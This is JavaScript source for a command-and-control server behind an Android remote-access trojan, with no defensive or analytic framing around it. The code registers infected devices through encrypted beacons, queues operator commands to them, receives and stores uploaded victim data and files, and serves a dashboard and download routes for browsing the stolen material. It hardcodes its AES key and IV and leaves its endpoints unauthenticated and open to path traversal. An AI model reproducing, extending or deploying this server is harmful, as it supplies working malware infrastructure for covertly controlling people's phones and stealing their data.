const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const WebSocket = require('ws');
const https = require('https');

// AES Encryption
const AES_KEY = Buffer.from('0123456789abcdef0123456789abcdef', 'utf8');
const AES_IV = Buffer.from('abcdef9876543210', 'utf8');

function aesEncrypt(text) {
    const cipher = crypto.createCipheriv('aes-256-cbc', AES_KEY, AES_IV);
    let encrypted = cipher.update(text, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return encrypted;
}

function aesDecrypt(encrypted) {
    const decipher = crypto.createDecipheriv('aes-256-cbc', AES_KEY, AES_IV);
    let decrypted = decipher.update(encrypted, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

// Initialize database
const db = new sqlite3.Database('./rat_c2.db');

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        device_id TEXT PRIMARY KEY,
        model TEXT,
        android_version TEXT,
        ip_address TEXT,
        last_seen DATETIME,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        command INTEGER,
        params TEXT,
        status TEXT DEFAULT 'pending',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        executed_at DATETIME
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        data_type TEXT,
        data TEXT,
        file_path TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

const app = express();
app.use(bodyParser.text({ type: '*/*' }));

// API Endpoint for RAT beacons
app.post('/api/v1/beacon', (req, res) => {
    try {
        const encrypted = req.body;
        const decrypted = aesDecrypt(encrypted);
        const data = JSON.parse(decrypted);

        const deviceId = data.device_id;
        const ip = req.ip.replace('::ffff:', '');

        // Update device info
        db.run(`INSERT OR REPLACE INTO devices 
                (device_id, model, android_version, ip_address, last_seen) 
                VALUES (?, ?, ?, ?, datetime('now'))`,
            [deviceId, data.model, data.android_version, ip]);

        // Check for pending commands
        db.get(`SELECT * FROM commands 
                WHERE device_id = ? AND status = 'pending' 
                ORDER BY created_at LIMIT 1`,
            [deviceId], (err, command) => {
                if (command) {
                    const response = {
                        command: command.command,
                        params: JSON.parse(command.params || '{}')
                    };
                    
                    // Mark command as sent
                    db.run(`UPDATE commands SET status = 'sent', 
                            executed_at = datetime('now') WHERE id = ?`,
                        [command.id]);
                    
                    res.send(aesEncrypt(JSON.stringify(response)));
                } else {
                    res.send(aesEncrypt(JSON.stringify({ command: 0 })));
                }
            });

    } catch (error) {
        console.error('Beacon error:', error);
        res.status(500).send('Error');
    }
});

// API for data upload from RAT
app.post('/api/v1/upload', (req, res) => {
    try {
        const encrypted = req.body;
        const decrypted = aesDecrypt(encrypted);
        const data = JSON.parse(decrypted);

        const deviceId = data.device_id;
        const dataType = data.data_type;
        const fileData = data.file_data;

        // Save file if present
        let filePath = null;
        if (fileData && data.file_name) {
            const uploadDir = path.join(__dirname, 'uploads', deviceId);
            if (!fs.existsSync(uploadDir)) {
                fs.mkdirSync(uploadDir, { recursive: true });
            }
            
            filePath = path.join(uploadDir, data.file_name);
            const buffer = Buffer.from(fileData, 'base64');
            fs.writeFileSync(filePath, buffer);
        }

        // Save to database
        db.run(`INSERT INTO data (device_id, data_type, data, file_path) 
                VALUES (?, ?, ?, ?)`,
            [deviceId, dataType, JSON.stringify(data), filePath]);

        res.send(aesEncrypt(JSON.stringify({ status: 'ok' })));

    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).send('Error');
    }
});

// WebSocket for real-time updates
const wss = new WebSocket.Server({ noServer: true });

wss.on('connection', (ws) => {
    console.log('WebSocket client connected');

    // Send initial device list
    db.all(`SELECT * FROM devices ORDER BY last_seen DESC`, (err, devices) => {
        ws.send(JSON.stringify({
            type: 'devices_list',
            data: devices
        }));
    });

    ws.on('message', (message) => {
        const data = JSON.parse(message);
        
        if (data.type === 'send_command') {
            db.run(`INSERT INTO commands (device_id, command, params) 
                    VALUES (?, ?, ?)`,
                [data.device_id, data.command, JSON.stringify(data.params)]);
            
            // Broadcast to all clients
            wss.clients.forEach(client => {
                if (client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify({
                        type: 'command_sent',
                        data: { device_id: data.device_id }
                    }));
                }
            });
        }
    });
});

// Web Dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/devices', (req, res) => {
    db.all(`SELECT * FROM devices ORDER BY last_seen DESC`, (err, rows) => {
        res.json(rows);
    });
});

app.get('/data/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const dataType = req.query.type;
    
    let query = `SELECT * FROM data WHERE device_id = ?`;
    const params = [deviceId];
    
    if (dataType && dataType !== 'all') {
        query += ` AND data_type = ?`;
        params.push(dataType);
    }
    
    query += ` ORDER BY created_at DESC`;
    
    db.all(query, params, (err, rows) => {
        res.json(rows);
    });
});

app.get('/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    
    db.all(`SELECT * FROM commands WHERE device_id = ? ORDER BY created_at DESC`,
        [deviceId], (err, rows) => {
            res.json(rows);
        });
});

// File download
app.get('/download/:deviceId/:filename', (req, res) => {
    const filePath = path.join(__dirname, 'uploads', req.params.deviceId, req.params.filename);
    
    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).send('File not found');
    }
});

// HTTPS setup (optional but recommended)
const sslOptions = {
    key: fs.readFileSync('server.key'),
    cert: fs.readFileSync('server.crt')
};

const server = https.createServer(sslOptions, app);
server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, (ws) => {
        wss.emit('connection', ws, request);
    });
});

const PORT = 443;
server.listen(PORT, () => {
    console.log(`C2 Server running on https://0.0.0.0:${PORT}`);
    console.log(`Dashboard: https://localhost:${PORT}`);
});

// Or for HTTP only:
// app.listen(80, () => {
//     console.log('C2 Server running on http://0.0.0.0:80');
// });
